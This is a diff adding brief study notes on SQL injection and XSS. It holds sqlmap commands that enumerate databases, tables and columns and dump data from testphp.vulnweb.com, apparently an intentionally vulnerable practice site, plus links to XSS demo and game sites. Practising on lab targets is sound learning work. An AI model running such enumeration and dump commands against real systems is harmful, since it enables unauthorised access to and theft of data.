@@ -1,0 +1,20 @@
+Sql injection
+http://testphp.vulnweb.com/listproducts.php?cat=*
+
+List information about the existing databases
+      $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs 
+
+Listing tables present in Database 
+       $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables 
+
+List column information of a particular table
+      $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products --columns
+
+Dump the data from the columns 
+      $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products -C name --dump 
+
+XSS:
+
+https://github.com/programster/xss-demo-site
+
+http://www.xssgame.com/m4KKGHi2rVUN
